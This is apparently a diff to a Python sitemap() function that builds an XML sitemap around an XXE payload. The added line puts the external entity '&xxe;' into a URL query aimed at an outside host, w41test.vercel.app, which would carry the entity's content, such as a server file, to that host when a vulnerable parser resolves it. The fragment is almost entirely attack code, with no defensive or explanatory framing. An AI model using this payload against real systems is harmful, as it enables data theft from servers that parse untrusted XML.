@@ -22,7 +22,7 @@ def sitemap():
     ]>
     <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
         <url>
-            <loc>&xxe;</loc>
+            <loc>https://w41test.vercel.app/?=&xxe;</loc>
             <lastmod>2025-07-30</lastmod>
             <changefreq>daily</changefreq>
             <priority>1.0</priority>
